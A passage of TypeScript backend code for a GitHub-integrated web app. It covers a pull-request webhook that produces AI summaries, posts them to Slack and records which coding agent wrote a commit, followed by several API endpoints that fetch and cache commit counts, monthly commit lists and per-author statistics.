              prUrl,
            });
          }
        }

        // 最新コミットからエージェント情報を抽出
        let commitAgentName: string | null = null;
        let commitAgentVersion: string | null = null;
        let commitAgentSignal: 'message' | 'author' | 'pr' | null = null;
        let latestCommitSha: string | null = null;
        let latestCommitMessage: string | null = null;
        let latestCommitAuthorName: string | null = null;
        let latestCommitAuthorEmail: string | null = null;
        if (githubToken && pr.commits_url) {
          try {
            const latestCommit = await fetchLatestPrCommitInfo(pr.commits_url, githubToken);
            if (latestCommit) {
              latestCommitSha = latestCommit.sha || null;
              latestCommitMessage = latestCommit.message;
              latestCommitAuthorName = latestCommit.authorName;
              latestCommitAuthorEmail = latestCommit.authorEmail;
              const agent = detectCommitAgentFromText(latestCommit.message, latestCommit.authorName, latestCommit.authorEmail);
              if (agent) {
                commitAgentName = agent.agentName;
                commitAgentVersion = agent.agentVersion;
                commitAgentSignal = agent.signal;
              }
            }
          } catch (error) {
            logger.warn('Failed to fetch PR commits for agent detection', {
              error: error instanceof Error ? error.message : 'Unknown error',
              prUrl,
            });
          }
        }
        if (!commitAgentName) {
          const prDetected = detectCommitAgentFromPrText(title, description);
          if (prDetected) {
            commitAgentName = prDetected.agentName;
            commitAgentVersion = prDetected.agentVersion;
            commitAgentSignal = prDetected.signal;
          }
        }

        // AI 要約
        const pipelineResult = await runSummaryPipeline({
          ai: ai as { run(model: string, input: { messages: { role: string; content: string }[] }): Promise<unknown> } | null,
          model: aiModel,
          fallbackModel: FALLBACK_AI_MODEL,
          title,
          description,
          trimmedDiff,
          designSpec: DESIGN_SPEC_CHECKLIST,
        });
        const rawSummary = pipelineResult.summary;
        if (!pipelineResult.success) {
          logger.warn('AI summary pipeline failed', { summary: rawSummary, prUrl, githubTokenSet: !!githubToken });
        }

        // AI出力から「初期設計との差異」セクションを分離
        const extracted = extractDesignDiff(rawSummary);
        const summary = extracted.summary;
        const designDiff = extracted.designDiff;

        // Slack 通知
        const slackPayload = buildSlackMessage({
          prAction,
          prNumber,
          title,
          repoFullName,
          author,
          prUrl,
          summary,
          dailySeq,
          requestId,
          designDiff,
          fallbackUsed: pipelineResult.fallbackUsed,
          primaryModel: aiModel,
          fallbackModel: FALLBACK_AI_MODEL,
          summaryModel: pipelineResult.usedModel,
          commitAgentName: commitAgentName ?? undefined,
          commitAgentVersion,
          commitAgentSignal,
        });

        let slackNotified = false;
        try {
          const slackResult = await postSlackMessage({ token: slackToken, channel: slackChannel, text: slackPayload.text, blocks: slackPayload.blocks });
          if (slackResult.ok) {
            slackNotified = true;
          } else {
            logger.error('Slack notification failed for PR webhook', {
              error: slackResult.error,
              status: slackResult.status,
              prUrl,
            });
          }
        } catch (error) {
          logger.error('Slack notification threw for PR webhook', {
            error: error instanceof Error ? error.message : 'Unknown error',
            prUrl,
          });
        }

        // D1 にログを書き込み
        if (db) {
          try {
            await db.prepare(`
              INSERT INTO ai_summary_log
                (request_id, daily_seq, event_date, event_type, repo_full_name, pr_number, pr_action, pr_url, model, summary, diff_length, slack_notified, created_at, fallback_used, primary_model)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            `).bind(
              requestId,
              dailySeq,
              eventDate,
              'pr_summary',
              repoFullName,
              prNumber,
              prAction,
              prUrl,
              pipelineResult.usedModel,
              summary !== '' ? summary : null,
              diffLength,
              slackNotified ? 1 : 0,
              now.toISOString(),
              pipelineResult.fallbackUsed ? 1 : 0,
              aiModel,
            ).run();

            const commitAgentLogEntry = buildCommitAgentLogEntry({
              requestId,
              repoFullName,
              prNumber,
              commitSha: latestCommitSha,
              commitMessage: latestCommitMessage,
              commitAuthorName: latestCommitAuthorName,
              commitAuthorEmail: latestCommitAuthorEmail,
              detectedAgentName: commitAgentName,
              detectedAgentVersion: commitAgentVersion,
              detectedSignal: commitAgentSignal,
              createdAtIso: now.toISOString(),
            });

            if (commitAgentLogEntry) {
              try {
                await db.prepare(`
                  INSERT INTO commit_agent_log
                    (request_id, repo_full_name, pr_number, commit_sha, commit_message, commit_author_name, commit_author_email, detected_agent_name, detected_agent_version, detected_signal, created_at)
                  VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                `).bind(
                  commitAgentLogEntry.requestId,
                  commitAgentLogEntry.repoFullName,
                  commitAgentLogEntry.prNumber,
                  commitAgentLogEntry.commitSha,
                  commitAgentLogEntry.commitMessage,
                  commitAgentLogEntry.commitAuthorName,
                  commitAgentLogEntry.commitAuthorEmail,
                  commitAgentLogEntry.detectedAgentName,
                  commitAgentLogEntry.detectedAgentVersion,
                  commitAgentLogEntry.detectedSignal,
                  commitAgentLogEntry.createdAtIso,
                ).run();
              } catch (agentLogError) {
                logger.warn('Failed to insert commit_agent_log', {
                  error: agentLogError instanceof Error ? agentLogError.message : 'Unknown error',
                  requestId,
                });
              }
            }
            // 要約結果を自動診断してフィードバックを記録
            const diagnosis = classifySummaryResult(summary !== '' ? summary : null);
            try {
              await db.prepare(`
                INSERT INTO ai_summary_reviews
                  (summary_request_id, rating, reviewer_type, reviewer_name, review_model, comment, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?)
              `).bind(
                requestId,
                diagnosis.rating,
                'system',
                'auto-diagnosis',
                aiModel,
                diagnosis.comment,
                now.toISOString(),
              ).run();
            } catch (feedbackError) {
              logger.warn('Failed to insert auto-diagnosis feedback', {
                error: feedbackError instanceof Error ? feedbackError.message : 'Unknown error',
                requestId,
              });
            }
          } catch (error) {
            logger.error('Failed to insert ai_summary_log', {
              error: error instanceof Error ? error.message : 'Unknown error',
              requestId,
            });
          }
        }
      }
    }
  }

  return c.json({ success: true, event: eventType, action }, 200);
});

// =====================================================
// API エンドポイント
// =====================================================

app.get('/api/repositories/:owner/:repo/issues-count', optionalAuthMiddleware, async (c) => {
  const user = c.get('user');
  if (!user) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  const owner = c.req.param('owner');
  const repo = c.req.param('repo');
  if (!owner || !repo) {
    return c.json({ error: 'Invalid repository parameters' }, 400);
  }

  const userSession = await getUserSession(c.env.DB, user.sub);
  const accessToken = userSession?.githubAccessToken ?? user.github_access_token ?? undefined;

  let result = await getGitHubRepoOpenIssuesCount({ owner, repo, accessToken });
  if (result.count === null && accessToken) {
    result = await getGitHubRepoOpenIssuesCount({ owner, repo });
  }

  if (result.count === null) {
    if (result.status === 401 || result.status === 403 || result.status === 404) {
      return c.json({ error: 'Insufficient permissions' }, 403);
    }
    return c.json({ error: 'Failed to fetch issues count' }, 502);
  }

  return c.json({ count: result.count });
});
app.get('/api/repositories/:owner/:repo/commits', optionalAuthMiddleware, async (c) => {
  const user = c.get('user');
  if (!user) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  const owner = c.req.param('owner');
  const repo = c.req.param('repo');
  if (!owner || !repo) {
    return c.json({ error: 'Invalid repository parameters' }, 400);
  }

  const requestedPerPage = Number(c.req.query('per_page'));
  const defaultPageSize = resolveCommitHistoryPageSize(c.env.COMMIT_HISTORY_PAGE_SIZE);
  const perPage = Number.isFinite(requestedPerPage)
    ? Math.min(100, Math.max(1, Math.floor(requestedPerPage)))
    : defaultPageSize;

  const userSession = await getUserSession(c.env.DB, user.sub);
  const accessToken = userSession?.githubAccessToken ?? user.github_access_token ?? undefined;

  try {
    const countResult = await getGitHubCommitCount({ owner, repo, accessToken });
    const commitsResult = await getGitHubCommits({ owner, repo, perPage, accessToken });
    if (commitsResult.status === 401 || commitsResult.status === 403 || commitsResult.status === 404) {
      return c.json({ error: 'Insufficient permissions' }, 403);
    }
    if (commitsResult.status < 200 || commitsResult.status >= 300) {
      logger.error('Failed to fetch commit history', {
        userId: user.sub,
        owner,
        repo,
        status: commitsResult.status,
      });
      return c.json({ error: 'Failed to fetch commit history' }, 502);
    }

    return c.json({
      totalCommits: countResult.total,
      commits: commitsResult.commits,
      perPage,
    });
  } catch (error) {
    logger.error('Failed to fetch commit history', {
      userId: user.sub,
      owner,
      repo,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'Failed to fetch commit history' }, 502);
  }
});

// コミット統計（ユーザー別コミット回数・マージ承認回数）
// 過去の確定月はD1キャッシュを参照し、当月・全期間はGitHub APIに問い合わせる
app.get('/api/repositories/:owner/:repo/commit-stats', optionalAuthMiddleware, async (c) => {
  const user = c.get('user');
  if (!user) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  const owner = c.req.param('owner');
  const repo = c.req.param('repo');
  if (!owner || !repo) {
    return c.json({ error: 'Invalid repository parameters' }, 400);
  }

  const period = c.req.query('period') ?? '';

  const now = new Date();
  const currentJstYM = getJstYearMonthParts(now);
  const currentYMStr = currentJstYM.year + '-' + String(currentJstYM.month).padStart(2, '0');
  const isPastPeriod = period !== '' && period < currentYMStr;

  if (c.env.DB && isPastPeriod) {
    try {
      const cached = await c.env.DB.prepare(
        'SELECT author_login, author_name, commit_count, merge_count FROM commit_stats_cache WHERE owner = ? AND repo = ? AND period = ? ORDER BY commit_count DESC'
      ).bind(owner, repo, period).all<{ author_login: string; author_name: string | null; commit_count: number; merge_count: number }>();
      if (cached.results && cached.results.length > 0) {
        return c.json({
          period,
          rows: cached.results.map(r => ({
            authorLogin: r.author_login,
            authorName: r.author_name,
            commitCount: r.commit_count,
            mergeCount: r.merge_count,
          })),
          cached: true,
        });
      }
    } catch (e) {
      logger.warn('commit_stats_cache read failed', {
        owner, repo, period, error: e instanceof Error ? e.message : 'Unknown',
      });
    }
  }

  const userSession = await getUserSession(c.env.DB, user.sub);
  const accessToken = userSession?.githubAccessToken ?? user.github_access_token ?? undefined;

  let since: string | undefined;
  let until: string | undefined;

  if (period) {
    const [yearStr, monthStr] = period.split('-');
    const y = parseInt(yearStr, 10);
    const m = parseInt(monthStr, 10);
    if (isNaN(y) || isNaN(m) || m < 1 || m > 12) {
      return c.json({ error: 'Invalid period format' }, 400);
    }
    since = new Date(Date.UTC(y, m - 1, 1, -9, 0, 0)).toISOString();
    until = new Date(Date.UTC(y, m, 1, -9, 0, 0)).toISOString();
  }

  try {
    const { commits, status } = await getGitHubCommitsForStats({ owner, repo, since, until, accessToken });
    if (status === 401 || status === 403 || status === 404) {
      return c.json({ error: 'Insufficient permissions' }, 403);
    }
    if (status < 200 || status >= 300) {
      logger.error('getGitHubCommitsForStats failed', { owner, repo, period, status });
      return c.json({ error: 'Failed to fetch commits from GitHub' }, 502);
    }

    const rows = computeCommitStats(commits);

    if (c.env.DB && isPastPeriod && rows.length > 0) {
      const cachedAt = now.toISOString();
      try {
        const stmts = rows.map(row =>
          c.env.DB!.prepare(
            'INSERT OR REPLACE INTO commit_stats_cache (owner, repo, period, author_login, author_name, commit_count, merge_count, cached_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)'
          ).bind(owner, repo, period, row.authorLogin || 'Unknown', row.authorName ?? null, row.commitCount, row.mergeCount, cachedAt)
        );
        await c.env.DB.batch(stmts);
      } catch (e) {
        logger.warn('commit_stats_cache write failed', {
          owner, repo, period, error: e instanceof Error ? e.message : 'Unknown',
        });
      }
    }

    return c.json({ period, rows, cached: false });
  } catch (error) {
    logger.error('commit-stats endpoint error', {
      owner, repo, period, error: error instanceof Error ? error.message : 'Unknown',
    });
    return c.json({ error: 'Internal server error' }, 500);
  }
});

// セレクトボックス用の月一覧を返す
// 戦略: リポジトリ作成月〜(当月-1) の各月について、commit_calendar_cache を確認し
//   - キーが存在しない場合: GitHub API から取得 → total_count を含めキャッシュ書き込み（0件でも保存）
//   - total_count > 0 の月のみ結果に含める
//   - 当月は常に結果に含める（ユーザビリティ優先・キャッシュ対象外）
// 診断情報を details に含めて返すことで、フロントエンドからキャッシュ確認・API取得の履行状況を可視化できる
app.get('/api/repositories/:owner/:repo/commit-months', optionalAuthMiddleware, async (c) => {
  const user = c.get('user');
  if (!user) return c.json({ error: 'Unauthorized' }, 401);
  const owner = c.req.param('owner');
  const repo = c.req.param('repo');
  if (!owner || !repo) return c.json({ error: 'Invalid repository parameters' }, 400);

  const now = new Date();
  const currentJstYM = getJstYearMonthParts(now);
  const currentMonth = `${currentJstYM.year}-${String(currentJstYM.month).padStart(2, '0')}`;

  type CommitMonthsDetails = {
    status: string;
    repoCreatedMonth: string | null;
    candidatesCount: number;
    cacheHits: number;
    fetched: number;
    fetchErrors: number;
    pastMonthsWithCommits: number;
    inconsistentRefetched: number;
    cacheReadError: string | null;
    repoInfoError: string | null;
  };
  const details: CommitMonthsDetails = {
    status: 'ok',
    repoCreatedMonth: null,
    candidatesCount: 0,
    cacheHits: 0,
    fetched: 0,
    fetchErrors: 0,
    pastMonthsWithCommits: 0,
    inconsistentRefetched: 0,
    cacheReadError: null,
    repoInfoError: null,
  };

  const wsInfo = c.env.DB ? await getCurrentWorkspace(c.env.DB, user.sub) : null;
  const workspaceId = wsInfo?.workspaceId ?? '';

  const userSession = await getUserSession(c.env.DB, user.sub);
  const accessToken = userSession?.githubAccessToken ?? user.github_access_token ?? undefined;

  if (!c.env.DB) {
    details.status = 'no_db';
    return c.json({ months: [currentMonth], currentMonth, details, cachedRepoCount: 0 });
  }
  if (!workspaceId) {
    details.status = 'no_workspace';
    return c.json({ months: [currentMonth], currentMonth, details, cachedRepoCount: 0 });
  }

  let cachedRepoCount = 0;
  try {
    const countRow = await c.env.DB.prepare(
      "SELECT COUNT(DISTINCT owner || '/' || repo) AS n FROM commit_stats_cache"
    ).first<{ n: number }>();
    cachedRepoCount = countRow?.n ?? 0;
  } catch (e) {
    logger.warn('commit-months: cached repo count failed', {
      error: e instanceof Error ? e.message : String(e),
    });
  }

  if (!accessToken) {
    details.status = 'no_access_token';
    return c.json({ months: [currentMonth], currentMonth, details, cachedRepoCount });
  }

  let createdYM: string | null = null;
  try {
    const info = await getGitHubRepoInfo({ owner, repo, accessToken });
    if (info.createdAt) {
      const d = new Date(info.createdAt);
      if (!isNaN(d.getTime())) {
        const j = getJstYearMonthParts(d);
        createdYM = `${j.year}-${String(j.month).padStart(2, '0')}`;
      }
    } else {
      details.repoInfoError = `GitHub API status ${info.status}`;
    }
  } catch (e) {
    details.repoInfoError = e instanceof Error ? e.message : String(e);
    logger.warn('commit-months: failed to fetch repo info', {
      owner, repo, error: details.repoInfoError,
    });
  }

  if (!createdYM) {
    details.status = 'no_repo_created_at';
    return c.json({ months: [currentMonth], currentMonth, details, cachedRepoCount });
  }
  details.repoCreatedMonth = createdYM;

  const candidates = buildPastMonthRange(createdYM, currentMonth);
  details.candidatesCount = candidates.length;

  let cachedRows: { year: number; month: number; total_count: number; counts: string }[] = [];
  try {
    const rows = await c.env.DB.prepare(
      'SELECT year, month, total_count, counts FROM commit_calendar_cache WHERE workspace_id = ? AND owner = ? AND repo = ?'
    ).bind(workspaceId, owner, repo).all<{ year: number; month: number; total_count: number; counts: string }>();
    cachedRows = rows.results ?? [];
  } catch (e) {
    details.cacheReadError = e instanceof Error ? e.message : String(e);
    logger.warn('commit-months: cache read failed', {
      owner, repo, error: details.cacheReadError,
    });
  }

  // ALTER TABLE 直後の不整合行（total_count = 0 だが counts JSON は非ゼロ要素を持つ）を検出
  // 該当行は cachedMap に入れず、後続の「未キャッシュ判定」経由で GitHub から再取得・全カラム上書きさせる
  const cachedMap = new Map<string, number>();
  const inconsistentMonths = new Set<string>();
  for (const row of cachedRows) {
    const ym = `${row.year}-${String(row.month).padStart(2, '0')}`;
    if (row.total_count === 0 && row.counts && row.counts !== '{}') {
      let recomputed = 0;
      try {
        recomputed = sumCountsTotal(JSON.parse(row.counts));
      } catch {
        recomputed = 0;
      }
      if (recomputed > 0) {
        inconsistentMonths.add(ym);
        continue;
      }
    }
    cachedMap.set(ym, row.total_count);
  }
  details.inconsistentRefetched = inconsistentMonths.size;

  for (const candidate of candidates) {
    if (cachedMap.has(candidate)) {
      details.cacheHits++;
      continue;
    }
    const [yStr, mStr] = candidate.split('-');
    const cY = parseInt(yStr, 10);
    const cM = parseInt(mStr, 10);
    let ghResult: { counts: Record<string, number>; commitsByDate: Record<string, CommitDetail[]> };
    try {
      ghResult = await getGitHubRepoCommitsByMonth({ owner, repo, year: cY, month: cM, accessToken });
    } catch (e) {
      details.fetchErrors++;
      logger.warn('commit-months: GitHub fetch failed for candidate', {
        owner, repo, candidate, error: e instanceof Error ? e.message : String(e),
      });
      continue;
    }
    const totalCount = sumCountsTotal(ghResult.counts);
    const cachedAt = new Date().toISOString();
    try {
      await c.env.DB.prepare(
        'INSERT INTO commit_calendar_cache (workspace_id, owner, repo, year, month, counts, total_count, cached_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?) ON CONFLICT (workspace_id, owner, repo, year, month) DO UPDATE SET counts = excluded.counts, total_count = excluded.total_count, cached_at = excluded.cached_at'
      ).bind(workspaceId, owner, repo, cY, cM, JSON.stringify(ghResult.counts), totalCount, cachedAt).run();

      for (const [date, dayCommits] of Object.entries(ghResult.commitsByDate)) {
        if (dayCommits.length > 0) {
          await c.env.DB.prepare(
            'INSERT INTO commit_list_cache (workspace_id, owner, repo, date, commits_json, commit_count, cached_at) VALUES (?, ?, ?, ?, ?, ?, ?) ON CONFLICT (workspace_id, owner, repo, date) DO UPDATE SET commits_json = excluded.commits_json, commit_count = excluded.commit_count, cached_at = excluded.cached_at'
          ).bind(workspaceId, owner, repo, date, JSON.stringify(dayCommits), dayCommits.length, cachedAt).run();
        }
      }

      const allCommits = Object.values(ghResult.commitsByDate).flat();
      if (allCommits.length > 0) {
        const statsRows = computeCommitStats(allCommits.map(cm => ({
          authorLogin: cm.authorLogin,
          authorName: cm.authorName,
          isMerge: cm.isMerge,
        })));
        for (const row of statsRows) {
          await c.env.DB.prepare(
            'INSERT OR REPLACE INTO commit_stats_cache (owner, repo, period, author_login, author_name, commit_count, merge_count, cached_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)'
          ).bind(owner, repo, candidate, row.authorLogin, row.authorName ?? null, row.commitCount, row.mergeCount, cachedAt).run();
        }
      }
      details.fetched++;
    } catch (e) {
      details.fetchErrors++;
      logger.warn('commit-months: cache write failed', {
        owner, repo, candidate, error: e instanceof Error ? e.message : String(e),
      });
    }
    cachedMap.set(candidate, totalCount);
  }

  const months: string[] = [currentMonth];
  const pastMonthsWithCommits = candidates.filter(ym => (cachedMap.get(ym) ?? 0) > 0);
  details.pastMonthsWithCommits = pastMonthsWithCommits.length;
  for (const ym of pastMonthsWithCommits) months.push(ym);

  return c.json({ months, currentMonth, details, cachedRepoCount });
});

// 月別コミット一覧（cache-first: 過去月はD1、当月はGitHub API）
// 過去月取得時は commit_calendar_cache / commit_list_cache / commit_stats_cache へ同時書き込み
app.get('/api/repositories/:owner/:repo/commits-by-month', optionalAuthMiddleware, async (c) => {
  const user = c.get('user');
  if (!user) return c.json({ error: 'Unauthorized' }, 401);
  const owner = c.req.param('owner');
  const repo = c.req.param('repo');
  if (!owner || !repo) return c.json({ error: 'Invalid repository parameters' }, 400);

  const period = c.req.query('period') ?? '';
  if (!period || !/^\d{4}-\d{2}$/.test(period)) return c.json({ error: 'Invalid period format' }, 400);
  const [yearStr, monthStr] = period.split('-');
  const year = parseInt(yearStr, 10);
  const month = parseInt(monthStr, 10);
  if (isNaN(year) || isNaN(month) || month < 1 || month > 12) return c.json({ error: 'Invalid period format' }, 400);

  const now = new Date();
  const currentJstYM = getJstYearMonthParts(now);
  const currentYMStr = `${currentJstYM.year}-${String(currentJstYM.month).padStart(2, '0')}`;
  const isPastMonth = period < currentYMStr;

  const wsInfo = c.env.DB ? await getCurrentWorkspace(c.env.DB, user.sub) : null;
  const workspaceId = wsInfo?.workspaceId ?? '';

  if (isPastMonth && c.env.DB && workspaceId) {
    try {
      const calCached = await c.env.DB.prepare(
        'SELECT 1 FROM commit_calendar_cache WHERE workspace_id = ? AND owner = ? AND repo = ? AND year = ? AND month = ?'
      ).bind(workspaceId, owner, repo, year, month).first<{ 1: number }>();

      if (calCached) {
        const listRows = await c.env.DB.prepare(
          'SELECT commits_json FROM commit_list_cache WHERE workspace_id = ? AND owner = ? AND repo = ? AND date LIKE ? ORDER BY date DESC'
        ).bind(workspaceId, owner, repo, `${period}-%`).all<{ commits_json: string }>();
        const commits = (listRows.results ?? []).flatMap(row => {
          try { return JSON.parse(row.commits_json) as CommitDetail[]; } catch { return []; }
        }).map(toClientCommit);
        return c.json({ period, commits, cached: true });
      }
    } catch (e) {
      logger.warn('commits-by-month cache read failed', {
        owner, repo, period, error: e instanceof Error ? e.message : String(e),
      });
    }
  }

  const userSession = await getUserSession(c.env.DB, user.sub);
  const accessToken = userSession?.githubAccessToken ?? user.github_access_token ?? undefined;
  if (!accessToken) return c.json({ error: 'No access token available' }, 401);

  let ghResult: { counts: Record<string, number>; commitsByDate: Record<string, CommitDetail[]> };
  try {
    ghResult = await getGitHubRepoCommitsByMonth({ owner, repo, year, month, accessToken });
  } catch (e) {
    logger.error('commits-by-month GitHub fetch failed', {
      owner, repo, period, error: e instanceof Error ? e.message : String(e),
    });
    return c.json({ error: 'Failed to fetch commits from GitHub' }, 502);
  }

  const { counts, commitsByDate } = ghResult;
  const allCommits = Object.values(commitsByDate).flat()
    .sort((a, b) => (b.date ?? '').localeCompare(a.date ?? ''));

  if (isPastMonth && c.env.DB && workspaceId) {
    const cachedAt = now.toISOString();
    const totalCount = sumCountsTotal(counts);
    try {
      await c.env.DB.prepare(
        'INSERT INTO commit_calendar_cache (workspace_id, owner, repo, year, month, counts, total_count, cached_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?) ON CONFLICT (workspace_id, owner, repo, year, month) DO UPDATE SET counts = excluded.counts, total_count = excluded.total_count, cached_at = excluded.cached_at'
      ).bind(workspaceId, owner, repo, year, month, JSON.stringify(counts), totalCount, cachedAt).run();

      for (const [date, dayCommits] of Object.entries(commitsByDate)) {
        if (dayCommits.length > 0) {
          await c.env.DB.prepare(
            'INSERT INTO commit_list_cache (workspace_id, owner, repo, date, commits_json, commit_count, cached_at) VALUES (?, ?, ?, ?, ?, ?, ?) ON CONFLICT (workspace_id, owner, repo, date) DO UPDATE SET commits_json = excluded.commits_json, commit_count = excluded.commit_count, cached_at = excluded.cached_at'
          ).bind(workspaceId, owner, repo, date, JSON.stringify(dayCommits), dayCommits.length, cachedAt).run();
        }
      }

      if (allCommits.length > 0) {
        const statsRows = computeCommitStats(allCommits.map(cm => ({
          authorLogin: cm.authorLogin,
          authorName: cm.authorName,
          isMerge: cm.isMerge,
        })));
        for (const row of statsRows) {
          await c.env.DB.prepare(
            'INSERT OR REPLACE INTO commit_stats_cache (owner, repo, period, author_login, author_name, commit_count, merge_count, cached_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)'
          ).bind(owner, repo, period, row.authorLogin, row.authorName ?? null, row.commitCount, row.mergeCount, cachedAt).run();
        }
      }
    } catch (e) {
      logger.warn('commits-by-month cache write failed', {
        owner, repo, period, error: e instanceof Error ? e.message : String(e),
      });
    }
  }

  return c.json({ period, commits: allCommits.map(toClientCommit), cached: false });
});

// コミットカレンダー（月別コミット数）
// 過去の確定月はD1キャッシュを参照し、当月のみGitHub APIに問い合わせる
app.get('/api/repositories/:owner/:repo/commits-calendar', optionalAuthMiddleware, async (c) => {
  const user = c.get('user');
  if (!user) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  const owner = c.req.param('owner');
  const repo = c.req.param('repo');
  const yearStr = c.req.query('year');
  const monthStr = c.req.query('month');

  if (!owner || !repo) {
    return c.json({ error: 'Invalid repository parameters' }, 400);
  }

  const now = new Date();
  const currentJstYearMonth = getJstYearMonthParts(now);
  const year = yearStr ? parseInt(yearStr, 10) : currentJstYearMonth.year;
  const month = monthStr ? parseInt(monthStr, 10) : currentJstYearMonth.month;

  if (isNaN(year) || isNaN(month) || month < 1 || month > 12) {
    return c.json({ error: 'Invalid year/month parameters' }, 400);
  }

  // 過去の月かどうか判定（当月・未来月はキャッシュ不可）
  const isPastMonth = year < currentJstYearMonth.year || (year === currentJstYearMonth.year && month < currentJstYearMonth.month);

  // ワークスペースIDを解決（キャッシュのネームスペース分離に使用）
  const wsInfo = c.env.DB ? await getCurrentWorkspace(c.env.DB, user.sub) : null;
  const workspaceId = wsInfo?.workspaceId ?? '';

  // 過去月ならD1キャッシュを確認
  if (isPastMonth && c.env.DB && workspaceId) {
    try {
      const cached = await c.env.DB.prepare(
        'SELECT counts FROM commit_calendar_cache WHERE workspace_id = ? AND owner = ? AND repo = ? AND year = ? AND month = ?'
      ).bind(workspaceId, owner, repo, year, month).first<{ counts: string }>();
      if (cached) {
        return c.json({ year, month, counts: JSON.parse(cached.counts), cached: true });
      }
    } catch (e) {
      logger.warn('Failed to read commit calendar cache from D1', {
        owner, repo, year: String(year), month: String(month),
        error: e instanceof Error ? e.message : 'Unknown error',
      });
    }
  }

  const userSession = await getUserSession(c.env.DB, user.sub);
  const accessToken = userSession?.githubAccessToken ?? user.github_access_token ?? undefined;

  if (!accessToken) {
    return c.json({ error: 'No access token available' }, 401);
  }

  const result = await getGitHubRepoCommitsByMonth({ owner, repo, year, month, accessToken });
  const { counts, commitsByDate } = result;

  // D1にキャッシュ保存（ワークスペース単位）
  if (c.env.DB && workspaceId) {
    const cachedAt = now.toISOString();

    // カレンダーキャッシュ（counts + total_count）を保存（過去月・当月ともに保存）
    try {
      const totalCount = sumCountsTotal(counts);
      await c.env.DB.prepare(
        'INSERT INTO commit_calendar_cache (workspace_id, owner, repo, year, month, counts, total_count, cached_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?) ON CONFLICT (workspace_id, owner, repo, year, month) DO UPDATE SET counts = excluded.counts, total_count = excluded.total_count, cached_at = excluded.cached_at'
      ).bind(workspaceId, owner, repo, year, month, JSON.stringify(counts), totalCount, cachedAt).run();
    } catch (e) {
      logger.warn('Failed to write commit calendar cache to D1', {
        owner, repo, year: String(year), month: String(month),
        error: e instanceof Error ? e.message : 'Unknown error',
      });
    }

    // コミット詳細を日別に commit_list_cache へ一括保存
    // （後で commits-by-date を呼んだときにキャッシュヒットする）
    const dates = Object.keys(commitsByDate);
    if (dates.length > 0) {
      try {
        // 既にキャッシュ済みの日付を取得（重複INSERT回避）
        const placeholders = dates.map(() => '?').join(',');
        const existing = await c.env.DB.prepare(
          `SELECT date FROM commit_list_cache WHERE workspace_id = ? AND owner = ? AND repo = ? AND date IN (${placeholders})`
        ).bind(workspaceId, owner, repo, ...dates).all<{ date: string }>();
        const existingDates = new Set(existing.results?.map(r => r.date) ?? []);

        // 未キャッシュの日付のみバッチ保存
        const newDates = dates.filter(d => !existingDates.has(d));
        for (const date of newDates) {
          const dayCommits = commitsByDate[date];
          if (dayCommits.length > 0) {
            await c.env.DB.prepare(
              'INSERT INTO commit_list_cache (workspace_id, owner, repo, date, commits_json, commit_count, cached_at) VALUES (?, ?, ?, ?, ?, ?, ?) ON CONFLICT (workspace_id, owner, repo, date) DO NOTHING'
            ).bind(workspaceId, owner, repo, date, JSON.stringify(dayCommits), dayCommits.length, cachedAt).run();
          }
        }
      } catch (e) {
        logger.warn('Failed to batch-write commit list cache to D1', {
          owner, repo, year: String(year), month: String(month),
          error: e instanceof Error ? e.message : 'Unknown error',
        });
      }
    }
  }

  return c.json({ year, month, counts });
});

// 特定日のコミット詳細一覧を取得する
app.get('/api/repositories/:owner/:repo/commits-by-date', optionalAuthMiddleware, async (c) => {
  const user = c.get('user');
  if (!user) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  const owner = c.req.param('owner');
  const repo = c.req.param('repo');
  const date = c.req.query('date'); // YYYY-MM-DD

  if (!owner || !repo || !date) {
    return c.json({ error: 'owner, repo, date are required' }, 400);
  }

  if (!/^\d{4}-\d{2}-\d{2}$/.test(date)) {
    return c.json({ error: 'Invalid date format. Use YYYY-MM-DD' }, 400);
  }

  const userSession = await getUserSession(c.env.DB, user.sub);
  const accessToken = userSession?.githubAccessToken ?? user.github_access_token ?? undefined;

  if (!accessToken) {
    return c.json({ error: 'No access token available' }, 401);
  }

  // ワークスペースIDを解決（キャッシュのネームスペース分離に使用）
  const wsInfo = c.env.DB ? await getCurrentWorkspace(c.env.DB, user.sub) : null;
  const workspaceId = wsInfo?.workspaceId ?? '';

  // キャッシュ統計を更新するヘルパー
  const incrementCacheStat = async (field: 'github_fetch_count' | 'cache_save_count' | 'cache_lookup_count' | 'cache_hit_count') => {
    if (!c.env.DB) return;
    try {
      const now = new Date().toISOString();
      await c.env.DB.prepare(
        `INSERT INTO cache_stats (user_id, owner, repo, ${field}, last_updated_at) VALUES (?, ?, ?, 1, ?) ON CONFLICT (user_id, owner, repo) DO UPDATE SET ${field} = ${field} + 1, last_updated_at = excluded.last_updated_at`
      ).bind(user.sub, owner, repo, now).run();
    } catch (e) {
      logger.warn('Failed to update cache stats', {
        field, owner, repo,
        error: e instanceof Error ? e.message : 'Unknown error',
      });
    }
  };

  // Step 1: D1キャッシュから参照
  if (c.env.DB && workspaceId) {
    try {
      await incrementCacheStat('cache_lookup_count');
      const cached = await c.env.DB.prepare(
        'SELECT commits_json FROM commit_list_cache WHERE workspace_id = ? AND owner = ? AND repo = ? AND date = ?'
      ).bind(workspaceId, owner, repo, date).first<{ commits_json: string }>();

      if (cached) {
        await incrementCacheStat('cache_hit_count');
        const commits: CommitDetail[] = JSON.parse(cached.commits_json);
        return c.json({ date, commits, source: 'cache' });
      }
    } catch (e) {
      logger.warn('Failed to read commit list cache from D1', {
        owner, repo, date,
        error: e instanceof Error ? e.message : 'Unknown error',
      });
    }
  }

  // Step 2: キャッシュに無い → GitHubから取得
  await incrementCacheStat('github_fetch_count');
  const commits = await getGitHubRepoCommitsByDate({ owner, repo, date, accessToken });

  // Step 3: 取得結果をキャッシュに保存
  if (c.env.DB && workspaceId && commits.length > 0) {
    try {
